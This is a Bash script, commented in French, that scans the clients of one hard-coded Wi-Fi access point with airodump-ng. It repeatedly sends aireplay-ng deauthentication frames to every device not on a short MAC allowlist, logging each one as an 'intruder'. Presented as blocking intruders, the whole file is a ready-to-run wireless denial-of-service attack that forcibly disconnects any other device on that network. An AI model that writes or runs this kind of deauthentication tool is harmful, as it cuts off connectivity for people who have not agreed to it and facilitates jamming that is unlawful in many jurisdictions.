#!/bin/bash

# === CONFIGURATION FIXE ===
AP_BSSID="CC:2D:21:E1:B1:59"
INTERFACE="wlan0mon"
CANAL=9
# === MAC AUTORISÉES (NE JAMAIS ÉJECTER) ===
AUTORISES=(
    "28:E3:47:6B:D5:C9" # ← TON PC (le tien)
    "28:C2:DD:42:CF:15"
    "00:E0:23:30:F2:43"

)
INTRUS_FILE="intrus_permanents.txt"
# ==================================

# Nettoyage
> "$INTRUS_FILE" 2>/dev/null || touch "$INTRUS_FILE"

# Normaliser les MAC autorisées en majuscules
for i in "${!AUTORISES[@]}"; do
    AUTORISES[$i]=$(echo "${AUTORISES[$i]}" | tr '[:lower:]' '[:upper:]')
done

echo "APPAREILS AUTORISÉS (${#AUTORISES[@]}):"
printf ' → %s\n' "${AUTORISES[@]}"
echo "--------------------------------------------------"

# Fonction : fixer le canal
set_channel() {
    sudo iw dev $INTERFACE set channel $CANAL > /dev/null 2>&1 || true
}

# Fonction : scanner les clients
scan_clients() {
    rm -f temp-*.csv
    sudo timeout 6 airodump-ng -c $CANAL --bssid $AP_BSSID $INTERFACE -w temp --output-format csv > /dev/null 2>&1
    if [[ -f temp-01.csv ]]; then
        awk '/Station MAC/,0' temp-01.csv 2>/dev/null | tail -n +2 | head -n -1 | cut -d',' -f1 | tr -d ' ' | grep -E '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$' | tr '[:lower:]' '[:upper:]'
    fi
    rm -f temp-*.csv
}

# Fonction : nettoyer les intrus déjà autorisés
clean_intrus() {
    if [[ -f "$INTRUS_FILE" ]]; then
        grep -v -i -f <(printf '%s\n' "${AUTORISES[@]}") "$INTRUS_FILE" > "${INTRUS_FILE}.tmp" 2>/dev/null
        mv "${INTRUS_FILE}.tmp" "$INTRUS_FILE"
    fi
}

# === DÉMARRAGE ===
set_channel
clean_intrus
echo "BLOCAGE TOTAL ACTIVÉ - $(date)"
echo "Appuie sur Ctrl+C pour arrêter."
echo "Seuls les appareils ci-dessus sont protégés."

# === BOUCLE PRINCIPALE ===
while true; do
    CLIENTS=$(scan_clients)

    # 1. Traiter chaque client détecté
    echo "$CLIENTS" | while IFS= read -r mac; do
        [[ -z "$mac" ]] && continue
        [[ "$mac" == "$AP_BSSID" ]] && continue

        # Si dans la liste autorisée → IGNORER
        if [[ " ${AUTORISES[*]} " == *" $mac "* ]]; then
            continue
        fi

        # Si pas encore dans les intrus → éjecter fort
        if ! grep -q "$mac" "$INTRUS_FILE" 2>/dev/null; then
            echo "[$(date +%H:%M:%S)] INTRUS → $mac (ÉJECTION FORTE)"
            sudo aireplay-ng -0 40 -a $AP_BSSID -c $mac $INTERFACE > /dev/null 2>&1 &
            echo "$mac" >> "$INTRUS_FILE"
        fi
    done

    # 2. Blocage continu sur intrus
    clean_intrus
    if [[ -s "$INTRUS_FILE" ]]; then
        count=$(wc -l < "$INTRUS_FILE")
        echo "[$(date +%H:%M:%S)] BLOCAGE CONTINU → $count intrus"
        while IFS= read -r intrus; do
            intrus=$(echo "$intrus" | tr '[:lower:]' '[:upper:]')
            [[ " ${AUTORISES[*]} " == *" $intrus "* ]] && continue
            sudo aireplay-ng -0 1 -a $AP_BSSID -c $intrus $INTERFACE > /dev/null 2>&1 &
            sleep 0.1
        done < "$INTRUS_FILE"
    fi

    sleep 7
done
